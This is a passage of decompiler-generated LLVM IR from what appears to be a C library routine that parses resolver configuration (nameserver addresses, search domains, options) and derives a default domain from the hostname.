  store i32 %v2_117d8, i32* %r2.global-to-local, align 4
  %v3_117dc = inttoptr i32 %v0_117d4 to i8*
  %v4_117dc = call i32 @inet_pton(i32 10, i8* %v3_117dc, i32 %v2_117d8)
  store i32 %v4_117dc, i32* %r0.global-to-local, align 4
  %tmp59 = icmp slt i32 %v4_117dc, 1
  br i1 %tmp59, label %dec_label_pc_117ec, label %dec_label_pc_11808

dec_label_pc_117ec:                               ; preds = %dec_label_pc_117b0
  %v0_117ec = load i32, i32* @r7, align 4
  store i32 %v0_117ec, i32* %r1.global-to-local, align 4
  store i32 %v2_117f0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_117f8 = inttoptr i32 %v0_117ec to i8*
  %v4_117f8 = call i32 @inet_pton(i32 2, i8* %v3_117f8, i32 %v2_117f0)
  store i32 %v4_117f8, i32* %r0.global-to-local, align 4
  %tmp60 = icmp slt i32 %v4_117f8, 1
  br i1 %tmp60, label %dec_label_pc_119e0.backedge, label %dec_label_pc_11808

dec_label_pc_11808:                               ; preds = %dec_label_pc_117ec, %dec_label_pc_117b0
  %v0_1180c.off0 = phi i16 [ 10, %dec_label_pc_117b0 ], [ 2, %dec_label_pc_117ec ]
  store i32 %v2_11808, i32* %r2.global-to-local, align 4
  store i16 %v0_1180c.off0, i16* %stack_var_-68, align 2
  store i32 13568, i32* %r3.global-to-local, align 4
  store i32 10480, i32* @r7, align 4
  %v0_1181c = load i32, i32* @r5, align 4
  %v2_1181c = add i32 %v0_1181c, 10480
  %v3_1181c = inttoptr i32 %v2_1181c to i32*
  %v4_1181c = load i32, i32* %v3_1181c, align 4
  store i32 10476, i32* @sl, align 4
  %v1_11824 = add i32 %v4_1181c, 1
  store i32 %v1_11824, i32* %r3.global-to-local, align 4
  store i32 28, i32* @r8, align 4
  %v2_1182c = mul i32 %v1_11824, 28
  store i32 %v2_1182c, i32* %r1.global-to-local, align 4
  %v2_11830 = add i32 %v0_1181c, 10476
  %v3_11830 = inttoptr i32 %v2_11830 to i32*
  %v4_11830 = load i32, i32* %v3_11830, align 4
  store i32 %v4_11830, i32* %r0.global-to-local, align 4
  %v2_11834 = inttoptr i32 %v4_11830 to i32*
  %v3_11834 = call i32 @realloc(i32* %v2_11834, i32 %v2_1182c)
  store i32 %v3_11834, i32* %r0.global-to-local, align 4
  store i32 %v3_11834, i32* @r6, align 4
  %v2_11838 = icmp eq i32 %v3_11834, 0
  br i1 %v2_11838, label %dec_label_pc_119e0.backedge, label %dec_label_pc_11840

dec_label_pc_11840:                               ; preds = %dec_label_pc_11808
  %v0_11840 = load i32, i32* @r5, align 4
  %v1_11840 = load i32, i32* @r7, align 4
  %v2_11840 = add i32 %v1_11840, %v0_11840
  %v3_11840 = inttoptr i32 %v2_11840 to i32*
  %v4_11840 = load i32, i32* %v3_11840, align 4
  store i32 %v4_11840, i32* %r4.global-to-local, align 4
  %v1_11844 = load i32, i32* @r8, align 4
  %v3_11844 = mul i32 %v1_11844, %v4_11840
  %v4_11844 = add i32 %v3_11844, %v3_11834
  store i32 %v4_11844, i32* %lr.global-to-local, align 4
  %v2_1184c = load i16, i16* %stack_var_-68, align 2
  %v3_1184c = sext i16 %v2_1184c to i32
  store i32 %v3_1184c, i32* %r0.global-to-local, align 4
  %v6_1184c = load i32, i32* %stack_var_-64, align 4
  store i32 %v6_1184c, i32* %r1.global-to-local, align 4
  %v9_1184c = load i32, i32* %stack_var_-60, align 4
  store i32 %v9_1184c, i32* %r2.global-to-local, align 4
  store i32 %v14_1184c, i32* @ip, align 4
  %v2_11850 = load i32, i32* @sl, align 4
  %v3_11850 = add i32 %v2_11850, %v0_11840
  %v4_11850 = inttoptr i32 %v3_11850 to i32*
  store i32 %v3_11834, i32* %v4_11850, align 4
  %v0_11854 = load i32, i32* %lr.global-to-local, align 4
  %v1_11854 = inttoptr i32 %v0_11854 to i32*
  %v2_11854 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_11854, i32* %v1_11854, align 4
  %v3_11854 = add i32 %v0_11854, 4
  %v4_11854 = inttoptr i32 %v3_11854 to i32*
  %v5_11854 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_11854, i32* %v4_11854, align 4
  %v6_11854 = add i32 %v0_11854, 8
  %v7_11854 = inttoptr i32 %v6_11854 to i32*
  %v8_11854 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_11854, i32* %v7_11854, align 4
  %v9_11854 = add i32 %v0_11854, 12
  %v10_11854 = inttoptr i32 %v9_11854 to i32*
  %v11_11854 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v11_11854, i32* %v10_11854, align 4
  %v12_11854 = add i32 %v0_11854, 16
  store i32 %v12_11854, i32* @lr, align 4
  %v2_11858 = load i32, i32* %stack_var_-52, align 4
  store i32 %v2_11858, i32* %r0.global-to-local, align 4
  %v0_1185c = load i32, i32* %r4.global-to-local, align 4
  %v1_1185c = add i32 %v0_1185c, 1
  store i32 %v1_1185c, i32* %r4.global-to-local, align 4
  %v1_11860 = inttoptr i32 %v12_11854 to i32*
  store i32 %v2_11858, i32* %v1_11860, align 4
  %v3_11860 = add i32 %v0_11854, 20
  %v4_11860 = inttoptr i32 %v3_11860 to i32*
  %v5_11860 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_11860, i32* %v4_11860, align 4
  %v6_11860 = add i32 %v0_11854, 24
  %v7_11860 = inttoptr i32 %v6_11860 to i32*
  %v8_11860 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_11860, i32* %v7_11860, align 4
  %v0_11864 = load i32, i32* %r4.global-to-local, align 4
  %v1_11864 = load i32, i32* @r5, align 4
  %v2_11864 = load i32, i32* @r7, align 4
  %v3_11864 = add i32 %v2_11864, %v1_11864
  %v4_11864 = inttoptr i32 %v3_11864 to i32*
  store i32 %v0_11864, i32* %v4_11864, align 4
  br label %dec_label_pc_119e0.backedge

dec_label_pc_1186c:                               ; preds = %dec_label_pc_11784
  %v0_1186c = load i32, i32* @r4, align 4
  store i32 %v0_1186c, i32* %r0.global-to-local, align 4
  store i32 %v2_119bc, i32* @r1, align 4
  %v2_11874 = inttoptr i32 %v0_1186c to i8*
  %v3_11874 = call i32 @__GI_strcoll(i8* %v2_11874, i32 %v2_119bc)
  store i32 %v3_11874, i32* %r0.global-to-local, align 4
  %v2_11878 = icmp eq i32 %v3_11874, 0
  br i1 %v2_11878, label %dec_label_pc_118ac, label %dec_label_pc_11880

dec_label_pc_11880:                               ; preds = %dec_label_pc_1186c
  %v0_11880 = load i32, i32* @r4, align 4
  store i32 %v0_11880, i32* %r0.global-to-local, align 4
  store i32 %v2_119c8, i32* @r1, align 4
  %v2_11888 = inttoptr i32 %v0_11880 to i8*
  %v3_11888 = call i32 @__GI_strcoll(i8* %v2_11888, i32 %v2_119c8)
  store i32 %v3_11888, i32* %r0.global-to-local, align 4
  %v2_1188c = icmp eq i32 %v3_11888, 0
  br i1 %v2_1188c, label %dec_label_pc_118ac, label %dec_label_pc_1192c

dec_label_pc_11898:                               ; preds = %dec_label_pc_118ac, %dec_label_pc_11898.dec_label_pc_11898_crit_edge
  %v2_1189c = phi i32 [ %v1_118b0, %dec_label_pc_11898.dec_label_pc_11898_crit_edge ], [ %v1_118b010, %dec_label_pc_118ac ]
  %v0_1189c = phi i32 [ %v1_118b8, %dec_label_pc_11898.dec_label_pc_11898_crit_edge ], [ %v1_118b817, %dec_label_pc_118ac ]
  %v1_11898 = phi i32 [ %v1_11898.pre, %dec_label_pc_11898.dec_label_pc_11898_crit_edge ], [ 10472, %dec_label_pc_118ac ]
  %v1_1189c = phi i32 [ %v0_118b0, %dec_label_pc_11898.dec_label_pc_11898_crit_edge ], [ %v0_118b09, %dec_label_pc_118ac ]
  %v2_11898 = add i32 %v1_1189c, %v1_11898
  %v3_11898 = inttoptr i32 %v2_11898 to i32*
  %v4_11898 = load i32, i32* %v3_11898, align 4
  store i32 %v4_11898, i32* %r3.global-to-local, align 4
  %v3_1189c = add i32 %v1_1189c, %v2_1189c
  %v4_1189c = inttoptr i32 %v3_1189c to i32*
  store i32 %v0_1189c, i32* %v4_1189c, align 4
  %v0_118a0 = load i32, i32* %r3.global-to-local, align 4
  %v1_118a0 = load i32, i32* %r2.global-to-local, align 4
  %v4_118a0 = mul i32 %v1_118a0, 4
  %v5_118a0 = add i32 %v4_118a0, %v0_118a0
  %v6_118a0 = inttoptr i32 %v5_118a0 to i32*
  %v7_118a0 = load i32, i32* %v6_118a0, align 4
  store i32 %v7_118a0, i32* @r0, align 4
  %v0_118a4 = call i32 @free()
  store i32 %v0_118a4, i32* %r0.global-to-local, align 4
  %v0_118b0 = load i32, i32* @r5, align 4
  %v1_118b0 = load i32, i32* @sb, align 4
  %v2_118b0 = add i32 %v1_118b0, %v0_118b0
  %v3_118b0 = inttoptr i32 %v2_118b0 to i32*
  %v4_118b0 = load i32, i32* %v3_118b0, align 4
  store i32 %v4_118b0, i32* %r3.global-to-local, align 4
  %v2_118b4 = icmp eq i32 %v4_118b0, 0
  %v1_118b8 = add i32 %v4_118b0, -1
  store i32 %v1_118b8, i32* %r2.global-to-local, align 4
  br i1 %v2_118b4, label %dec_label_pc_118c0, label %dec_label_pc_11898.dec_label_pc_11898_crit_edge

dec_label_pc_11898.dec_label_pc_11898_crit_edge:  ; preds = %dec_label_pc_11898
  %v1_11898.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_11898

dec_label_pc_118ac:                               ; preds = %dec_label_pc_11880, %dec_label_pc_1186c
  store i32 10472, i32* @r4, align 4
  %v0_118b09 = load i32, i32* @r5, align 4
  %v1_118b010 = load i32, i32* @sb, align 4
  %v2_118b011 = add i32 %v1_118b010, %v0_118b09
  %v3_118b012 = inttoptr i32 %v2_118b011 to i32*
  %v4_118b013 = load i32, i32* %v3_118b012, align 4
  store i32 %v4_118b013, i32* %r3.global-to-local, align 4
  %v2_118b415 = icmp eq i32 %v4_118b013, 0
  %v1_118b817 = add i32 %v4_118b013, -1
  store i32 %v1_118b817, i32* %r2.global-to-local, align 4
  br i1 %v2_118b415, label %dec_label_pc_118c0, label %dec_label_pc_11898

dec_label_pc_118c0:                               ; preds = %dec_label_pc_11898, %dec_label_pc_118ac
  store i32 10472, i32* @r6, align 4
  br label %dec_label_pc_118c4

dec_label_pc_118c4:                               ; preds = %dec_label_pc_11908, %dec_label_pc_118c0
  %v0_118c4 = load i32, i32* @r7, align 4
  store i32 %v0_118c4, i32* %r0.global-to-local, align 4
  %v0_118c8 = call i32 @skip_nospace()
  store i32 %v0_118c8, i32* %r0.global-to-local, align 4
  %v1_118cc = inttoptr i32 %v0_118c8 to i8*
  %v2_118cc = call i32 @skip_and_NUL_space(i8* %v1_118cc)
  store i32 %v2_118cc, i32* %r0.global-to-local, align 4
  %v0_118d0 = load i32, i32* @r5, align 4
  %v1_118d0 = load i32, i32* @sb, align 4
  %v2_118d0 = add i32 %v1_118d0, %v0_118d0
  %v3_118d0 = inttoptr i32 %v2_118d0 to i32*
  %v4_118d0 = load i32, i32* %v3_118d0, align 4
  store i32 %v2_118cc, i32* @r4, align 4
  %tmp69 = mul i32 %v4_118d0, 4
  %v3_118dc = add i32 %tmp69, 4
  store i32 %v3_118dc, i32* %r1.global-to-local, align 4
  %v1_118e0 = load i32, i32* @r6, align 4
  %v2_118e0 = add i32 %v1_118e0, %v0_118d0
  %v3_118e0 = inttoptr i32 %v2_118e0 to i32*
  %v4_118e0 = load i32, i32* %v3_118e0, align 4
  store i32 %v4_118e0, i32* %r0.global-to-local, align 4
  %v2_118e4 = inttoptr i32 %v4_118e0 to i32*
  %v3_118e4 = call i32 @realloc(i32* %v2_118e4, i32 %v3_118dc)
  store i32 %v3_118e4, i32* %r3.global-to-local, align 4
  %v2_118e8 = icmp eq i32 %v3_118e4, 0
  %v0_118ec = load i32, i32* @r7, align 4
  store i32 %v0_118ec, i32* %r0.global-to-local, align 4
  %v0_118f0 = load i32, i32* @r4, align 4
  store i32 %v0_118f0, i32* @r7, align 4
  br i1 %v2_118e8, label %dec_label_pc_119e0.backedge, label %dec_label_pc_118f8

dec_label_pc_118f8:                               ; preds = %dec_label_pc_118c4
  %v1_118f8 = load i32, i32* @r5, align 4
  %v2_118f8 = load i32, i32* @r6, align 4
  %v3_118f8 = add i32 %v2_118f8, %v1_118f8
  %v4_118f8 = inttoptr i32 %v3_118f8 to i32*
  store i32 %v3_118e4, i32* %v4_118f8, align 4
  %v1_118fc = inttoptr i32 %v0_118ec to i8*
  %v2_118fc = call i32 @__GI_strdup(i8* %v1_118fc)
  store i32 %v2_118fc, i32* %r0.global-to-local, align 4
  %v2_11900 = icmp eq i32 %v2_118fc, 0
  br i1 %v2_11900, label %dec_label_pc_119e0.backedge, label %dec_label_pc_11908

dec_label_pc_11908:                               ; preds = %dec_label_pc_118f8
  %v0_11908 = load i32, i32* @r5, align 4
  %v1_11908 = load i32, i32* @sb, align 4
  %v2_11908 = add i32 %v1_11908, %v0_11908
  %v3_11908 = inttoptr i32 %v2_11908 to i32*
  %v4_11908 = load i32, i32* %v3_11908, align 4
  store i32 %v4_11908, i32* %r3.global-to-local, align 4
  %v1_1190c = load i32, i32* @r6, align 4
  %v2_1190c = add i32 %v1_1190c, %v0_11908
  %v3_1190c = inttoptr i32 %v2_1190c to i32*
  %v4_1190c = load i32, i32* %v3_1190c, align 4
  store i32 %v4_1190c, i32* %r2.global-to-local, align 4
  %v1_11910 = add i32 %v4_11908, 1
  store i32 %v1_11910, i32* %r1.global-to-local, align 4
  %v5_11914 = mul i32 %v4_11908, 4
  %v6_11914 = add i32 %v4_1190c, %v5_11914
  %v7_11914 = inttoptr i32 %v6_11914 to i32*
  store i32 %v2_118fc, i32* %v7_11914, align 4
  %v0_11918 = load i32, i32* %r1.global-to-local, align 4
  %v1_11918 = load i32, i32* @r5, align 4
  %v2_11918 = load i32, i32* @sb, align 4
  %v3_11918 = add i32 %v2_11918, %v1_11918
  %v4_11918 = inttoptr i32 %v3_11918 to i32*
  store i32 %v0_11918, i32* %v4_11918, align 4
  %v0_1191c = load i32, i32* @r4, align 4
  %v1_1191c = inttoptr i32 %v0_1191c to i8*
  %v2_1191c = load i8, i8* %v1_1191c, align 1
  %v3_1191c = zext i8 %v2_1191c to i32
  store i32 %v3_1191c, i32* %r3.global-to-local, align 4
  %v2_11920 = icmp eq i8 %v2_1191c, 0
  br i1 %v2_11920, label %dec_label_pc_119e0.backedge, label %dec_label_pc_118c4

dec_label_pc_1192c:                               ; preds = %dec_label_pc_11880
  %v0_1192c = load i32, i32* @r4, align 4
  store i32 %v0_1192c, i32* %r0.global-to-local, align 4
  %v2_11930 = load i32, i32* %stack_var_-560, align 4
  store i32 %v2_11930, i32* @r1, align 4
  %v2_11934 = inttoptr i32 %v0_1192c to i8*
  %v3_11934 = call i32 @__GI_strcoll(i8* %v2_11934, i32 %v2_11930)
  store i32 %v3_11934, i32* %r0.global-to-local, align 4
  %sext2 = mul i32 %v3_11934, 16777216
  %v1_11938 = sdiv i32 %sext2, 16777216
  store i32 %v1_11938, i32* @r4, align 4
  %sext2.off = or i32 %sext2, 16777215
  %tmp70 = icmp ult i32 %sext2.off, 33554431
  br i1 %tmp70, label %dec_label_pc_11940, label %dec_label_pc_119e0.backedge

dec_label_pc_11940:                               ; preds = %dec_label_pc_1192c
  %v0_11940 = load i32, i32* @r7, align 4
  %v2_11940 = icmp eq i32 %v0_11940, 0
  br i1 %v2_11940, label %dec_label_pc_119e0.backedge, label %dec_label_pc_11948

dec_label_pc_11948:                               ; preds = %dec_label_pc_11940
  store i32 %v0_11940, i32* @r0, align 4
  store i32 58, i32* %r1.global-to-local, align 4
  %v2_11950 = call i32 @__GI_strchr(i32 %v0_11940, i32 58)
  store i32 %v2_11950, i32* %r0.global-to-local, align 4
  store i32 %v2_11950, i32* @r6, align 4
  %v3_11954 = icmp eq i32 %v2_11950, 0
  br i1 %v3_11954, label %dec_label_pc_119e0.backedge, label %dec_label_pc_1195c

dec_label_pc_1195c:                               ; preds = %dec_label_pc_11948
  store i32 -37224, i32* %r1.global-to-local, align 4
  %v0_11960 = load i32, i32* @r4, align 4
  %v1_11960 = trunc i32 %v0_11960 to i8
  %v3_11960 = inttoptr i32 %v2_11950 to i8*
  store i8 %v1_11960, i8* %v3_11960, align 1
  %v0_11964 = load i32, i32* @r5, align 4
  %v1_11964 = load i32, i32* %r1.global-to-local, align 4
  %v2_11964 = add i32 %v1_11964, %v0_11964
  store i32 %v2_11964, i32* @r1, align 4
  %v0_11968 = load i32, i32* @r7, align 4
  store i32 %v0_11968, i32* %r0.global-to-local, align 4
  %v2_1196c = inttoptr i32 %v0_11968 to i8*
  %v3_1196c = call i32 @__GI_strcoll(i8* %v2_1196c, i32 %v2_11964)
  store i32 %v3_1196c, i32* %r0.global-to-local, align 4
  %v2_11970 = icmp eq i32 %v3_1196c, 0
  br i1 %v2_11970, label %dec_label_pc_11998, label %dec_label_pc_1197c

dec_label_pc_1197c:                               ; preds = %dec_label_pc_1195c
  %v0_11980 = load i32, i32* @r7, align 4
  store i32 %v0_11980, i32* %r0.global-to-local, align 4
  %v0_11984 = load i32, i32* @r5, align 4
  %v2_11984 = add i32 %v0_11984, -37216
  store i32 %v2_11984, i32* @r1, align 4
  %v2_11988 = inttoptr i32 %v0_11980 to i8*
  %v3_11988 = call i32 @__GI_strcoll(i8* %v2_11988, i32 %v2_11984)
  store i32 %v3_11988, i32* %r0.global-to-local, align 4
  %v2_1198c = icmp eq i32 %v3_11988, 0
  br i1 %v2_1198c, label %dec_label_pc_11998, label %dec_label_pc_119e0.backedge

dec_label_pc_11998:                               ; preds = %dec_label_pc_1197c, %dec_label_pc_1195c
  %storemerge = phi i32 [ 726, %dec_label_pc_1195c ], [ 727, %dec_label_pc_1197c ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v0_11998 = load i32, i32* @r6, align 4
  %v1_11998 = add i32 %v0_11998, 1
  store i32 %v1_11998, i32* @r0, align 4
  %v0_1199c = load i32, i32* @r5, align 4
  %v2_1199c = add i32 %v0_1199c, %storemerge
  store i32 %v2_1199c, i32* @r4, align 4
  %v1_119a0 = call i32 @atol(i32 %v1_11998)
  %v2_119a0 = trunc i32 %v1_119a0 to i8
  store i32 %v1_119a0, i32* %r0.global-to-local, align 4
  %v3_119a4 = load i32, i32* @r4, align 4
  %v4_119a4 = inttoptr i32 %v3_119a4 to i8*
  store i8 %v2_119a0, i8* %v4_119a4, align 1
  br label %dec_label_pc_119e0.backedge

dec_label_pc_119e0.backedge:                      ; preds = %dec_label_pc_11908, %dec_label_pc_118f8, %dec_label_pc_118c4, %dec_label_pc_11998, %dec_label_pc_11840, %dec_label_pc_117ec, %dec_label_pc_11808, %dec_label_pc_11940, %dec_label_pc_11948, %dec_label_pc_1192c, %dec_label_pc_1197c
  %v0_119ec.pre = load i32, i32* @fp, align 4
  store i32 %v2_119e0, i32* @r4, align 4
  store i32 %v2_119e0, i32* %r0.global-to-local, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  store i32 %v0_119ec.pre, i32* %r2.global-to-local, align 4
  %v3_119f0 = call i32 @fgets(i32 %v2_119e0, i32 128, i32 %v0_119ec.pre)
  store i32 %v3_119f0, i32* %r0.global-to-local, align 4
  %v2_119f4 = icmp eq i32 %v3_119f0, 0
  br i1 %v2_119f4, label %dec_label_pc_119fc, label %dec_label_pc_11784

dec_label_pc_119ac:                               ; preds = %dec_label_pc_1174c
  %v0_119b0 = load i32, i32* @r5, align 4
  %v2_119b0 = add i32 %v0_119b0, -37260
  %v2_119bc = add i32 %v0_119b0, -37248
  %v2_119c8 = add i32 %v0_119b0, -37240
  %v2_119d4 = add i32 %v0_119b0, -37232
  store i32 %v2_119d4, i32* %r3.global-to-local, align 4
  store i32 10484, i32* @sb, align 4
  store i32 %v2_119d4, i32* %stack_var_-560, align 4
  %v2_119e0 = ptrtoint i32* %stack_var_-288 to i32
  %v1_11788 = bitcast i32* %stack_var_-288 to i8*
  %v2_117b8 = ptrtoint i16* %stack_var_-68 to i32
  %v2_117cc = bitcast i16* %stack_var_-68 to i8*
  %v2_117d8 = ptrtoint i32* %stack_var_-60 to i32
  %v2_117f0 = ptrtoint i32* %stack_var_-64 to i32
  %v2_11808 = ptrtoint i32* %stack_var_-304 to i32
  %v14_1184c = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_119e0, i32* @r4, align 4
  store i32 %v2_119e0, i32* %r0.global-to-local, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  store i32 %v5_11774, i32* %r2.global-to-local, align 4
  %v3_119f066 = call i32 @fgets(i32 %v2_119e0, i32 128, i32 %v5_11774)
  store i32 %v3_119f066, i32* %r0.global-to-local, align 4
  %v2_119f468 = icmp eq i32 %v3_119f066, 0
  br i1 %v2_119f468, label %dec_label_pc_119fc, label %dec_label_pc_11784

dec_label_pc_119fc:                               ; preds = %dec_label_pc_119e0.backedge, %dec_label_pc_119ac
  %v0_119fc = load i32, i32* @fp, align 4
  store i32 %v0_119fc, i32* %r0.global-to-local, align 4
  %v1_11a00 = inttoptr i32 %v0_119fc to i16*
  %v2_11a00 = call i32 @__GI_fclose(i16* %v1_11a00)
  store i32 %v2_11a00, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11a04

dec_label_pc_11a04:                               ; preds = %dec_label_pc_1174c, %dec_label_pc_119fc
  store i32 10480, i32* %r3.global-to-local, align 4
  %v0_11a08 = load i32, i32* @r5, align 4
  %v2_11a08 = add i32 %v0_11a08, 10480
  %v3_11a08 = inttoptr i32 %v2_11a08 to i32*
  %v4_11a08 = load i32, i32* %v3_11a08, align 4
  store i32 %v4_11a08, i32* %r3.global-to-local, align 4
  %v2_11a0c = icmp eq i32 %v4_11a08, 0
  br i1 %v2_11a0c, label %dec_label_pc_11a14, label %dec_label_pc_11a50

dec_label_pc_11a14:                               ; preds = %dec_label_pc_11a04
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_11a18 = call i32 @malloc(i32 28)
  store i32 %v1_11a18, i32* %r0.global-to-local, align 4
  store i32 -37204, i32* %r3.global-to-local, align 4
  store i32 10476, i32* %r2.global-to-local, align 4
  %v2_11a24 = icmp eq i32 %v1_11a18, 0
  %v1_11a28 = load i32, i32* @r5, align 4
  br i1 %v2_11a24, label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_11a14
  %v3_11a28 = add i32 %v1_11a28, -37204
  store i32 %v3_11a28, i32* %r3.global-to-local, align 4
  %v3_11a2c28 = add i32 %v1_11a28, 10476
  %v4_11a2c29 = inttoptr i32 %v3_11a2c28 to i32*
  store i32 0, i32* %v4_11a2c29, align 4
  %v1_11a30 = load i32, i32* %r3.global-to-local, align 4
  %v2_11a30 = load i32, i32* @r5, align 4
  %v3_11a30 = load i32, i32* %r2.global-to-local, align 4
  %v4_11a30 = add i32 %v3_11a30, %v2_11a30
  %v5_11a30 = inttoptr i32 %v4_11a30 to i32*
  store i32 %v1_11a30, i32* %v5_11a30, align 4
  br label %.thread4

bb63:                                             ; preds = %dec_label_pc_11a14
  %v3_11a2c = add i32 %v1_11a28, 10476
  %v4_11a2c = inttoptr i32 %v3_11a2c to i32*
  store i32 %v1_11a18, i32* %v4_11a2c, align 4
  %v1_11a34 = load i32, i32* @r5, align 4
  %v2_11a34 = load i32, i32* %r3.global-to-local, align 4
  %v3_11a34 = add i32 %v2_11a34, %v1_11a34
  store i32 %v3_11a34, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %bb62, %bb63
  store i32 72256, i32* @lr, align 4
  %v1_11a3c = xor i1 %v2_11a24, true
  call void @__pseudo_cond_branch(i1 %v1_11a3c, i32 ptrtoint (i32* @global_var_aca0.198 to i32))
  store i32 10480, i32* %r2.global-to-local, align 4
  %v0_11a44 = load i32, i32* @r5, align 4
  %v2_11a44 = add i32 %v0_11a44, 10480
  %v3_11a44 = inttoptr i32 %v2_11a44 to i32*
  %v4_11a44 = load i32, i32* %v3_11a44, align 4
  %v1_11a48 = add i32 %v4_11a44, 1
  store i32 %v1_11a48, i32* %r3.global-to-local, align 4
  store i32 %v1_11a48, i32* %v3_11a44, align 4
  %v0_11a54.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_11a50

dec_label_pc_11a50:                               ; preds = %dec_label_pc_11a04, %.thread4
  %v0_11a54 = phi i32 [ %v0_11a08, %dec_label_pc_11a04 ], [ %v0_11a54.pre, %.thread4 ]
  store i32 10484, i32* @r7, align 4
  %v2_11a54 = add i32 %v0_11a54, 10484
  %v3_11a54 = inttoptr i32 %v2_11a54 to i32*
  %v4_11a54 = load i32, i32* %v3_11a54, align 4
  store i32 %v4_11a54, i32* @r4, align 4
  %v2_11a58 = icmp eq i32 %v4_11a54, 0
  br i1 %v2_11a58, label %dec_label_pc_11a60, label %dec_label_pc_11ae0

dec_label_pc_11a60:                               ; preds = %dec_label_pc_11a50
  %v2_11a60 = ptrtoint i32* %stack_var_-544 to i32
  store i32 %v2_11a60, i32* @r6, align 4
  store i32 %v2_11a60, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_11a6c = call i32 @__GI_gethostname(i32 %v2_11a60, i32 255)
  store i32 %v2_11a6c, i32* %r0.global-to-local, align 4
  %v2_11a70 = icmp eq i32 %v2_11a6c, 0
  br i1 %v2_11a70, label %dec_label_pc_11a7c, label %dec_label_pc_11ae0

dec_label_pc_11a7c:                               ; preds = %dec_label_pc_11a60
  store i32 %v2_11a60, i32* @r0, align 4
  store i32 46, i32* %r1.global-to-local, align 4
  %v2_11a84 = call i32 @__GI_strchr(i32 %v2_11a60, i32 46)
  store i32 %v2_11a84, i32* %r0.global-to-local, align 4
  %v2_11a88 = icmp eq i32 %v2_11a84, 0
  br i1 %v2_11a88, label %dec_label_pc_11ae0, label %dec_label_pc_11a90

dec_label_pc_11a90:                               ; preds = %dec_label_pc_11a7c
  %v1_11a90 = add i32 %v2_11a84, 1
  %v2_11a90 = inttoptr i32 %v1_11a90 to i8*
  %v3_11a90 = load i8, i8* %v2_11a90, align 1
  %v4_11a90 = zext i8 %v3_11a90 to i32
  store i32 %v4_11a90, i32* %r3.global-to-local, align 4
  %v2_11a94 = icmp eq i8 %v3_11a90, 0
  store i32 %v1_11a90, i32* %r0.global-to-local, align 4
  br i1 %v2_11a94, label %dec_label_pc_11ae0, label %dec_label_pc_11aa0

dec_label_pc_11aa0:                               ; preds = %dec_label_pc_11a90
  %v2_11aa0 = call i32 @__GI_strdup(i8* %v2_11a90)
  store i32 %v2_11aa0, i32* %r0.global-to-local, align 4
  store i32 %v2_11aa0, i32* @r4, align 4
  %v2_11aa4 = icmp eq i32 %v2_11aa0, 0
  br i1 %v2_11aa4, label %dec_label_pc_11ae0, label %dec_label_pc_11aac

dec_label_pc_11aac:                               ; preds = %dec_label_pc_11aa0
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_11ab0 = call i32 @malloc(i32 4)
  store i32 %v1_11ab0, i32* %r0.global-to-local, align 4
  store i32 10472, i32* %r3.global-to-local, align 4
  %v2_11ab8 = icmp eq i32 %v1_11ab0, 0
  %v1_11abc = load i32, i32* @r5, align 4
  %v3_11abc = add i32 %v1_11abc, 10472
  %v4_11abc = inttoptr i32 %v3_11abc to i32*
  store i32 %v1_11ab0, i32* %v4_11abc, align 4
  br i1 %v2_11ab8, label %dec_label_pc_11ac4, label %dec_label_pc_11ad0

dec_label_pc_11ac4:                               ; preds = %dec_label_pc_11aac
  %v0_11ac4 = load i32, i32* @r4, align 4
  store i32 %v0_11ac4, i32* @r0, align 4
  %v0_11ac8 = call i32 @free()
  store i32 %v0_11ac8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11ae0

dec_label_pc_11ad0:                               ; preds = %dec_label_pc_11aac
  %v0_11ad0 = load i32, i32* @r5, align 4
  %v1_11ad0 = load i32, i32* @r7, align 4
  %v2_11ad0 = add i32 %v1_11ad0, %v0_11ad0
  %v3_11ad0 = inttoptr i32 %v2_11ad0 to i32*
  %v4_11ad0 = load i32, i32* %v3_11ad0, align 4
  %v1_11ad4 = add i32 %v4_11ad0, 1
  store i32 %v1_11ad4, i32* %r3.global-to-local, align 4
  %v0_11ad8 = load i32, i32* @r4, align 4
  %v2_11ad8 = inttoptr i32 %v1_11ab0 to i32*
  store i32 %v0_11ad8, i32* %v2_11ad8, align 4
  %v0_11adc = load i32, i32* %r3.global-to-local, align 4
  %v1_11adc = load i32, i32* @r5, align 4
  %v2_11adc = load i32, i32* @r7, align 4
  %v3_11adc = add i32 %v2_11adc, %v1_11adc
  %v4_11adc = inttoptr i32 %v3_11adc to i32*
  store i32 %v0_11adc, i32* %v4_11adc, align 4
  br label %dec_label_pc_11ae0

dec_label_pc_11ae0:                               ; preds = %dec_label_pc_11a60, %dec_label_pc_11a50, %dec_label_pc_1173c, %dec_label_pc_11aa0, %dec_label_pc_11a90, %dec_label_pc_11a7c, %dec_label_pc_11ac4, %dec_label_pc_11ad0
  store i32 10468, i32* %r3.global-to-local, align 4
  %v0_11ae4 = load i32, i32* @r5, align 4
  %v2_11ae4 = add i32 %v0_11ae4, 10468
  %v3_11ae4 = inttoptr i32 %v2_11ae4 to i32*
  %v4_11ae4 = load i32, i32* %v3_11ae4, align 4
  store i32 %v4_11ae4, i32* %r0.global-to-local, align 4
  %v2_11ae8 = icmp eq i32 %v4_11ae4, 0
  br i1 %v2_11ae8, label %bb65, label %bb64

bb64:                                             ; preds = %dec_label_pc_11ae0
  store i32 72436, i32* %lr.global-to-local, align 4
  br label %bb65

bb65:                                             ; preds = %dec_label_pc_11ae0, %bb64
